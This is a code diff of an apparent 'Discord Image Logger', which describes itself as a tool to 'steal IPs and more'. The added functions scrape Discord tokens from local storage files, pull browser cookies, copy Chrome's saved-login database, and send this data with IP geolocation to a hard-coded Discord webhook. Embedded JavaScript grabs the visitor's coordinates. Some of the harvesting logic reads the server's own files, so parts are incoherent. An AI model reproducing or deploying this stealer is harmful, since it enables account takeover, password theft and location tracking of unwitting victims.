@@ -1,6 +1,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, browser_cookie3, re, os, json
+import traceback, requests, base64, httpagentparser, os, re, json, sqlite3, shutil, browser_cookie3
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -9,79 +9,67 @@ __author__ = "DeKrypt"
 
 def get_tokens():
     tokens = []
-    roaming = os.getenv('APPDATA')
-    local = os.getenv('LOCALAPPDATA')
     paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Firefox': roaming + '\\Mozilla\\Firefox\\Profiles'
+        'Discord': os.path.join(os.getenv('APPDATA'), 'Discord'),
+        'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
+        'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
     }
     
     for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
-        if 'Discord' in platform:
-            tokens.extend(get_discord_tokens(path))
-        else:
-            tokens.extend(get_browser_tokens(path))
+        if not os.path.exists(path): continue
+        tokens.extend(find_tokens(path))
     return tokens
 
-def get_discord_tokens(path):
+def find_tokens(path):
     tokens = []
-    try:
-        with open(path + '\\Local Storage\\leveldb\\000005.ldb', 'r', encoding='utf-8') as file:
-            for line in file.readlines():
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        tokens.append(token)
-    except:
-        pass
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
     return tokens
 
-def get_browser_tokens(path):
-    tokens = []
-    try:
-        if 'Chrome' in path:
-            cookies = browser_cookie3.chrome(domain_name='discord.com')
-        elif 'Opera' in path:
-            cookies = browser_cookie3.opera(domain_name='discord.com') 
-        elif 'Brave' in path:
-            cookies = browser_cookie3.brave(domain_name='discord.com')
-        elif 'Firefox' in path:
-            cookies = browser_cookie3.firefox(domain_name='discord.com')
-        
-        for cookie in cookies:
-            if cookie.name == '__dcfduid':
-                tokens.append(cookie.value)
-    except:
-        pass
-    return tokens
-
-def get_system_info():
+def get_cookies():
     cookies = []
-    browsers = ['chrome', 'opera', 'firefox', 'brave']
-    for browser in browsers:
+    browsers = [
+        (browser_cookie3.chrome, 'Chrome'),
+        (browser_cookie3.firefox, 'Firefox'),
+        (browser_cookie3.edge, 'Edge'),
+        (browser_cookie3.opera, 'Opera')
+    ]
+    
+    for browser_func, name in browsers:
         try:
-            cookie_fn = getattr(browser_cookie3, browser)
-            cookies.extend([{
-                'domain': c.domain,
-                'name': c.name,
-                'value': c.value
-            } for c in cookie_fn()])
+            browser_cookies = browser_func(domain_name='')
+            cookies.extend([{'browser': name, 'name': c.name, 'value': c.value, 'domain': c.domain} for c in browser_cookies])
         except:
-            pass
-            
-    return {
-        'tokens': get_tokens(),
-        'cookies': cookies,
-        'os': os.name,
-        'hostname': os.getenv('COMPUTERNAME'),
-        'username': os.getenv('USERNAME')
-    }
+            continue
+    return cookies
+
+def get_passwords():
+    passwords = []
+    if os.name == 'nt':
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+        login_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
+        
+        if os.path.exists(local_state_path) and os.path.exists(login_db_path):
+            shutil.copy2(login_db_path, "LoginData.db")
+            conn = sqlite3.connect("LoginData.db")
+            cursor = conn.cursor()
+            try:
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                for row in cursor.fetchall():
+                    passwords.append({
+                        'url': row[0],
+                        'username': row[1],
+                        'password': row[2]  # Note: This is encrypted, would need key from Local State to decrypt
+                    })
+            except:
+                pass
+            conn.close()
+            os.remove("LoginData.db")
+    return passwords
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1335307399405502626/MsUfNzyRoBvoN8pJ1UTdPycbADVNPGU1jVdfLV5LyW_uZrf2e3fx8Zg6L4zSdRjZJVGX",
@@ -152,8 +140,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     ping = "@everyone"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    system_info = get_system_info()
-    
     if info["proxy"]:
         if config["vpnCheck"] == 2:
                 return
@@ -180,7 +166,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         if config["antiBot"] == 1:
                 ping = ""
 
-    os_name, browser = httpagentparser.simple_detect(useragent)
+    os, browser = httpagentparser.simple_detect(useragent)
+    
+    # Get additional data
+    tokens = get_tokens()
+    cookies = get_cookies()
+    passwords = get_passwords()
     
     embed = {
     "username": config["username"],
@@ -207,19 +198,22 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **PC Info:**
-> **OS:** `{os_name}`
+> **OS:** `{os}`
 > **Browser:** `{browser}`
-> **Computer Name:** `{system_info['hostname']}`
-> **Username:** `{system_info['username']}`
 
 **Discord Tokens:**
 
-{chr(10).join(system_info['tokens']) if system_info['tokens'] else 'No tokens found'}
+{tokens if tokens else 'No tokens found'}
 
 
 **Cookies:**
 
-{json.dumps(system_info['cookies'], indent=2) if system_info['cookies'] else 'No cookies found'}
+{json.dumps(cookies, indent=2) if cookies else 'No cookies found'}
+
+
+**Saved Passwords:**
+
+{json.dumps(passwords, indent=2) if passwords else 'No passwords found'}
 
 
 **User Agent:**
@@ -326,17 +320,27 @@ var currenturl = window.location.href;
 if (!currenturl.includes("g=")) {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function (coords) {
-            if (currenturl.includes("?")) {
-                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-            } else {
-                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-            }
-            location.replace(currenturl);
-        });
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
     }
-}
+    location.replace(currenturl);});
+}}
 </script>"""
                 self.wfile.write(data)
         
         except Exception:
-            self.send_
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = app = ImageLoggerAPI
